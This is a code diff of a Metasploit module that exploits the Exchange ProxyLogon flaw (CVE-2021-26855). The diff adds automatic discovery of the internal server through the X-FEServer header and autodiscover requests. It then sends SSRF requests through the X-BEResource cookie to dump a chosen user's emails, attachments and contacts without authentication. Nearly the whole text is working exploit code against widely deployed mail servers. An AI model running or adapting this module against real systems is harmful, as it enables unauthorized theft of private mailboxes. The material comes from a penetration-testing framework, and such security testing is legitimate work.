@@ -13,15 +13,12 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Microsoft Exchange ProxyLogon Collector',
         'Description' => %q{
-          This module scan for a vulnerability on Microsoft Exchange Server that
+          This module exploit a vulnerability on Microsoft Exchange Server that
           allows an attacker bypassing the authentication and impersonating as the
           admin (CVE-2021-26855).
 
-          By chaining this bug with another post-auth arbitrary-file-write
-          vulnerability to get code execution (CVE-2021-27065).
-
-          As a result, an unauthenticated attacker can execute arbitrary commands on
-          Microsoft Exchange Server.
+          By taking advantage of this vulnerability, it is possible to dump all
+          mailboxes (emails, attachments, contacts, ...).
 
           This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
           Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
@@ -69,7 +66,8 @@ class MetasploitModule < Msf::Auxiliary
       OptBool.new('ATTACHMENTS', [true, 'Dump documents attached to an email', true]),
       OptString.new('EMAIL', [true, 'The email account what you want dump']),
       OptString.new('FOLDER', [true, 'The email folder what you want dump', 'inbox']),
-      OptString.new('SERVER_NAME', [true, 'The name of secondary internal Exchange server targeted'])
+      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check (only).', 'POST', ['GET', 'POST']]),
+      OptString.new('TARGET', [false, 'Force the name of the internal Exchange server targeted'])
     ])
 
     register_advanced_options([
@@ -79,12 +77,14 @@ class MetasploitModule < Msf::Auxiliary
 
   XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze
 
-  def dump_contacts
-    response = post_xml(soap_countitems(action['id_attribute']))
-    if response.body =~ /Success/
-      print_status(message('Connection established'))
+  def dump_contacts(server_name)
+    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"
 
+    response = send_xml(soap_countitems(action['id_attribute']), ssrf)
+    if response.body =~ /Success/
+      print_status(" * successfuly connected to: #{action['id_attribute']}")
       xml = Nokogiri::XML.parse(response.body)
+
       folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS).values[0]
       print_status(" * selected folder: #{action['id_attribute']} (#{folder_id})")
 
@@ -92,12 +92,11 @@ class MetasploitModule < Msf::Auxiliary
       print_status(" * number of contact found: #{total_count}")
 
       if total_count.to_i > datastore['MaxEntries']
-        print_warning(" * number of contact recaluled due to max entries: #{datastore['MaxEntries']}")
+        print_warning(" * number of contact recalculated due to max entries: #{datastore['MaxEntries']}")
         total_count = datastore['MaxEntries'].to_s
       end
-      print_status
 
-      response = post_xml(soap_listitems(action['id_attribute'], total_count))
+      response = send_xml(soap_listitems(action['id_attribute'], total_count), ssrf)
       xml = Nokogiri::XML.parse(response.body)
 
       print_status(message("Processing dump of #{total_count} items"))
@@ -110,12 +109,14 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def dump_emails
-    response = post_xml(soap_countitems(datastore['FOLDER']))
-    if response.body =~ /Success/
-      print_status(message('Connection established'))
+  def dump_emails(server_name)
+    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"
 
+    response = send_xml(soap_countitems(datastore['FOLDER']), ssrf)
+    if response.body =~ /Success/
+      print_status(" * successfuly connected to: #{datastore['FOLDER']}")
       xml = Nokogiri::XML.parse(response.body)
+
       folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS).values[0]
       print_status(" * selected folder: #{datastore['FOLDER']} (#{folder_id})")
 
@@ -123,53 +124,52 @@ class MetasploitModule < Msf::Auxiliary
       print_status(" * number of email found: #{total_count}")
 
       if total_count.to_i > datastore['MaxEntries']
-        print_warning(" * number of email recaluled due to max entries: #{datastore['MaxEntries']}")
+        print_warning(" * number of email recalculated due to max entries: #{datastore['MaxEntries']}")
         total_count = datastore['MaxEntries'].to_s
       end
-      print_status
 
       print_status(message("Processing dump of #{total_count} items"))
-      download_items(total_count)
+      download_items(total_count, ssrf)
     end
   end
 
-  def download_attachments(item_id)
-    response = post_xml(soap_listattachments(item_id))
+  def download_attachments(item_id, ssrf)
+    response = send_xml(soap_listattachments(item_id), ssrf)
     xml = Nokogiri::XML.parse(response.body)
 
-    xml.xpath('//t:Message/t:Attachments/t:FileAttachment', XMLNS).select do |item|
+    xml.xpath('//t:Message/t:Attachments/t:FileAttachment', XMLNS).each do |item|
       item_id = item.at_xpath('./t:AttachmentId', XMLNS).values[0]
 
-      response = post_xml(soap_downattachment(item_id))
+      response = send_xml(soap_downattachment(item_id), ssrf)
       data = Nokogiri::XML.parse(response.body)
 
       filename = data.at_xpath('//t:FileAttachment/t:Name', XMLNS).content
       ctype = data.at_xpath('//t:FileAttachment/t:ContentType', XMLNS).content
       content = data.at_xpath('//t:FileAttachment/t:Content', XMLNS).content
 
-      print_status(" * download attachment: '#{filename}'")
+      print_status("   -> attachment: #{item_id} (#{filename})")
       write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(content), filename, ctype)
     end
   end
 
-  def download_items(total_count)
-    response = post_xml(soap_listitems(datastore['FOLDER'], total_count))
+  def download_items(total_count, ssrf)
+    response = send_xml(soap_listitems(datastore['FOLDER'], total_count), ssrf)
     xml = Nokogiri::XML.parse(response.body)
 
-    xml.xpath('//t:Items/t:Message', XMLNS).select do |item|
+    xml.xpath('//t:Items/t:Message', XMLNS).each do |item|
       item_info = item.at_xpath('./t:ItemId', XMLNS).values
-      print_status(" * download: #{item_info[1]}")
+      print_status(" * download item: #{item_info[1]}")
 
-      attachments = item.at_xpath('./t:HasAttachments', XMLNS).content
-      if datastore['ATTACHMENTS'] && attachments == 'true'
-        download_attachments(item_info[0])
-      end
-
-      response = post_xml(soap_downitem(item_info[0], item_info[1]))
+      response = send_xml(soap_downitem(item_info[0], item_info[1]), ssrf)
       data = Nokogiri::XML.parse(response.body)
 
       email = data.at_xpath('//t:Message/t:MimeContent', XMLNS).content
       write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(email))
+
+      attachments = item.at_xpath('./t:HasAttachments', XMLNS).content
+      if datastore['ATTACHMENTS'] && attachments == 'true'
+        download_attachments(item_info[0], ssrf)
+      end
       print_status
     end
   end
@@ -178,19 +178,72 @@ class MetasploitModule < Msf::Auxiliary
     "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
 
-  def post_xml(data)
-    uri = normalize_uri('ecp', 'temp.js')
+  def request_autodiscover(server_name)
+    xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }
 
+    response = send_xml(soap_autodiscover, "#{server_name}/autodiscover/autodiscover.xml?a=~1942062522")
+    xml = Nokogiri::XML.parse(response.body)
+
+    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns).content
+    fail_with(Failure::Unknown, 'The \'LegacyDN\' value could not be found') if legacy_dn.empty?
+
+    server = ''
+    owa_urls = []
+    xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|
+      type = item.at_xpath('./xmlns:Type', xmlns).content
+      if type == 'EXCH'
+        server = item.at_xpath('./xmlns:Server', xmlns).content
+      end
+
+      next unless type == 'WEB'
+
+      item.xpath('./xmlns:Internal/xmlns:OWAUrl', xmlns).each do |owa_url|
+        owa_urls << owa_url.content
+      end
+    end
+    fail_with(Failure::Unknown, 'No \'OWAUrl\' was found') if owa_urls.empty?
+
+    return([server, legacy_dn, owa_urls])
+  end
+
+  def send_http(method, ssrf, data = '', ctype = 'application/x-www-form-urlencoded')
+    request = {
+      'method' => method,
+      'uri' => @random_uri,
+      'cookie' => "X-BEResource=#{ssrf};",
+      'ctype' => ctype
+    }
+    request = request.merge({ 'data' => data }) unless data.empty?
+
+    received = send_request_cgi(request)
+    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received
+
+    received
+  end
+
+  def send_xml(data, ssrf)
     received = send_request_cgi(
       'method' => 'POST',
-      'uri' => uri,
-      'cookie' => "X-BEResource=#{datastore['SERVER_NAME']}/EWS/Exchange.asmx?a=~3;",
+      'uri' => @random_uri,
+      'cookie' => "X-BEResource=#{ssrf};",
       'ctype' => 'text/xml; charset=utf-8',
       'data' => data
     )
     fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received
 
     received
+  end
+
+  def soap_autodiscover
+    <<~SOAP
+      <?xml version="1.0" encoding="utf-8"?>
+      <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+        <Request>
+          <EMailAddress>#{datastore['EMAIL']}</EMailAddress>
+          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+        </Request>
+      </Autodiscover>
+    SOAP
   end
 
   def soap_countitems(folder_id)
@@ -314,14 +367,57 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @proto = (ssl ? 'https' : 'http')
+    @random_uri = normalize_uri('ecp', "#{Rex::Text.rand_text_alpha(1..3)}.js")
 
+    print_status(message('Attempt to exploit for CVE-2021-26855'))
+
+    # request for internal server name.
+    response = send_http(datastore['METHOD'], 'localhost~1942062522')
+    if response.code != 500 || response.headers['X-FEServer'].empty?
+      print_bad('Could\'t get the \'X-FEServer\' from the headers response.')
+
+      return
+    end
+    server_name = response.headers['X-FEServer']
+    print_status(" * internal server name (#{server_name})")
+
+    # get informations by autodiscover request.
+    print_status(message('Sending autodiscover request'))
+    discover_info = request_autodiscover(server_name)
+    server_id = discover_info[0]
+    legacy_dn = discover_info[1]
+
+    print_status(" * Server: #{server_id}")
+    print_status(" * LegacyDN: #{legacy_dn}")
+
+    # selecting target
+    print_status(message('Selecting the first internal server found'))
+    if datastore['TARGET'].nil?
+      target = ''
+      discover_info[2].each do |url|
+        host = url.split('://')[1].split('.')[0].downcase
+        next unless host != server_name.downcase
+
+        target = host
+
+        break
+      end
+      fail_with(Failure::Unknown, 'No internal target was found') if target.empty?
+
+      print_status(" * targeting internal: #{target}")
+    else
+      target = datastore['TARGET']
+      print_status(" * targeting internal forced to: #{target}")
+    end
+
+    # run action
     case action.name
     when /Dump \(Contacts\)/
       print_status(message("Attempt to dump contacts for <#{datastore['EMAIL']}>"))
-      dump_contacts
+      dump_contacts(target)
     when /Dump \(Emails\)/
       print_status(message("Attempt to dump emails for <#{datastore['EMAIL']}>"))
-      dump_emails
+      dump_emails(target)
     end
   end
 
